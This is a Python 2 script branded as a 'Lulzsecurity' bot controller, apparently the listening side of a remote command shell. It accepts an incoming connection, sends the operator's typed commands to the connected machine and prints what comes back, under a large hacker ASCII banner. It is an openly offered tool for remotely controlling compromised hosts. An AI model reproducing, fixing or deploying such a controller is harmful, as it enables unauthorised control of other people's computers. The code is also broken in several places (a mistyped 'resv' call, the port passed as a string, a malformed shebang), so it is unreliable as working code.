#bin/env/python
#-*- coding: utf-8 -*-

import progressbar, matplotlib
import socket, subprocess as sp, sys

from time import sleep

SMALL_SIZE = 8
matplotlib.rc('font', size=SMALL_SIZE)
matplotlib.rc('axes', titlesize=SMALL_SIZE)
 

#colorschema
class colors:
    RED ="\033[31m"
    BLUE ="\033[34m"
    GREEN ="\033[32m"	
    RESET ="\033[0m"
    BLACK ="\033[30m"      
    YELLOW ="\033[33m"      
    MAGENTA ="\033[35m"      
    CYAN ="\033[36m"      
    WHITE ="\033[37m"  
    ORANGE ="\033[38m"
    BOLDBLACK ="\033[1m\033[30m"    
    BOLDYELLOW ="\033[1m\033[33m"      
    BOLDMAGENTA ="\033[1m\033[35m"      
    BOLDCYAN ="\033[1m\033[36m"     
    BOLDWHITE ="\033[1m\033[37m"     
    BOLDBLUE ="\033[1m\033[34m"
    BOLDGREEN ="\033[1m\033[32m"
    BOLDRED ="\033[1m\033[31m"
    BOLDORANGE ="\033[1m\033[38m"
    LIGHTGREEN ="\033[2m\033[30m"
    LIGHTRED ="\033[2m\033[31m"
    LIGHTBLUE ="\033[2m\033[32m"
    LIGHTYELLOW ="\033[2m\033[33m"
    LIGHTORANGE ="\033[2m\033[34m"
    LIGHTCYAN ="\033[2m\033[35m"
    LIGHTBLACK = "\033[2m\033[36m"
    LIGHTMAGENTA ="\033[2m\033[37m"


__version__ = "0.1"
__author__ = "Sensei | Nom3n N35c1o"
__toolname____ = ["Universal lulzsecurity bot controler"] 
__website__ = ""


host = sys.argv[1]
port = sys.argv[2]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((host, port))
s.listen(100)
conn, addr = s.accept()

print "{+} Connection Established from: %s" % (str(addr[0]))
#banner     
print colors.RED +'This is a official Lulzsecurity Universal tool'
print colors.BOLDRED +      ("        ▄▄▄███                          ")
print colors.BOLDRED +      ("   ▄▄██████████                         ")
print colors.BOLDRED +      (" ███████████████                        ")
print colors.BOLDORANGE +   (" ▀███████████████     ▄▄▄               ")
print colors.BOLDORANGE +   ("  ███████████████▄███▀▀▀                ")
print colors.BOLDYELLOW +   ("   ███████████████▄▄                    ")
print colors.BOLDYELLOW +   ("   ▄████████▀▀▄▄▄▄▄░▀                   ")
print colors.YELLOW +       ("▄███████▀█▄▀█▄░░█░▀▀▀░█  ▄▄             ")
print colors.BOLDGREEN +    ("▀▀   ██▄█▄░░▀█░░▄███████▄█▀   ▄         ")        
print colors.BOLDGREEN +    ("     █░█▀▄▄▀▄▀░█▀▀▀█▀▄▄▀      ▄ ▄█      ")
print colors.BOLDGREEN +    ("     █░█░░▀▀▄▄█▀░█▀▀░░█       ▀██       ")     
print colors.BOLDCYAN +     ("     ▀█▄░░░░░░░░░░░░░▄▀      ▄██        ") 
print colors.BOLDCYAN  +    ("      ▀█▄▄░░░░░░░░▄▄█      ▄▀ █         ")
print colors.BOLDCYAN  +    ("        ▀███▀▀████▄██▄▄  ▄▀             ")
print colors.BOLDBLUE  +    ("          █▄▀██▀██▀▄█▄ ▀▀               ")  
print colors.BOLDBLUE   +   ("          ██░▀█▄█ █▀ ▀▄                 ")
print colors.BOLDBLUE   +   ("          █░█▄░░▀█▄▄▄  █                ")
print colors.BOLDMAGENTA +  ("          █▀██▀▀▀▀ █▄  █                ")
print colors.BOLDMAGENTA +  ("             ▀         ▀                ")

print colors.BOLDRED     +   ("██╗     ██╗   ██╗██████╗  ██████╗   ██████╗ ██╗   ██╗") 
print colors.BOLDYELLOW  +   ("██║     ██║   ██║██╔══██╗██╔════╝   ██╔══██╗╚██╗ ██╔╝") 
print colors.BOLDGREEN   +   ("██║     ██║   ██║██████╔╝██║        ██████╔╝ ╚████╔╝ ") 
print colors.BOLDCYAN    +   ("██║     ██║   ██║██╔══██╗██║        ██╔═══╝   ╚██╔╝  ") 
print colors.BOLDBLUE    +   ("███████╗╚██████╔╝██████╔╝╚██████╗██╗██║        ██║   ") 
print colors.BOLDRED     +   ("╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝╚═╝╚═╝        ╚═╝   ") 

print 
print     
print colors.BOLDBLUE
print __author__
print
print colors.BOLDYELLOW
print __toolname____
print 
print colors.BOLDGREEN
print __version__
print 


while 1: 
	command = raw_input("#> ")
	
	if command != ("exit()"):
	     if command == "": continue
	     
	     conn.send(command)
	     result = conn.resv(1024)
	     
	     total_size = long(result[:16])
	     result = result[16:] 
	     
	     while total_size > len(result):
			 data = conn.resv(1024)
			 result += data
			 
			 print result.rstrip("\n")

s.close()		
